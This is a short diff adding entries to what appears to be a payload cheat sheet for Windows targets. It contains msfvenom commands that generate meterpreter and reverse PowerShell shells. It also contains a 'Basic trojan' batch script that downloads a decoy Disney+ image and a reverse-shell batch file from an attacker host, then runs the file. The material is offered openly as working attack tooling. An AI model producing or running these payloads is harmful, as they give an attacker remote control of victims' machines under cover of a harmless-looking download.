@@ -45,3 +45,26 @@ Msiexec.exe:
 ```bash
 msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.1.109 lport=1234 -f msi > 1.msi
 ```
+
+powershell:
+```bash
+msfvenom -p cmd/windows/reverse_powershell lhost=192.168.63.128 lport=3434 > reverse.bat 
+```
+
+Basic trojan:
+```bash
+@echo off
+
+set "url1=https://prod-ripcut-delivery.disney-plus.net/v1/variant/disney/9B368B465A4DC909CDB6E799ACB64899B54E731B6D894FA5B080D75DB2F30533/scale?aspectRatio=1.78^&format=jpeg"
+set "url2=http://192.168.63.128:8081/reverse.bat"
+
+powershell -NoProfile -Command ^
+"$urls = @('%url1%', '%url2%'); ^
+foreach ($url in $urls) { ^
+  $fn = Join-Path $env:TEMP ([System.IO.Path]::GetFileName($url).Split('?')[0]); ^
+  try { Invoke-WebRequest -Uri $url -OutFile $fn -UseBasicParsing } catch { Write-Host 'Download failed for' $url; continue }; ^
+  if (Test-Path $fn) { ^
+    if ($fn -match '\.jpg$') { Start-Process mspaint.exe $fn } else { Start-Process $fn } ^
+  } else { Write-Host 'File not found after download:' $fn } ^
+}"
+```
